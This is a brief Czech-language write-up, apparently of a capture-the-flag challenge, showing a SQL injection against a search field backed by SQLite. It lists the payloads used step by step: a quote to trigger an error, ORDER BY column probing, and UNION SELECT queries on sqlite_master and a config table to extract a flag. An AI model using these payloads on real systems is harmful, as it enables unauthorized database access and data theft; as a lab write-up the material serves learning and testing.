# SQL Injection Write-up

## 🧪 1. Průzkum

Do vyhledávacího pole jsem zadal:

'
SQL Chyba: unrecognized token: "'"
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
Uživatel: 1 | Pozice: 2
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='config'--
 vysledek CREATE TABLE config (key TEXT, value TEXT)
' UNION SELECT NULL,sql FROM sqlite_master WHERE name='config'--
' UNION SELECT key,value FROM config-- 
vysledek flag
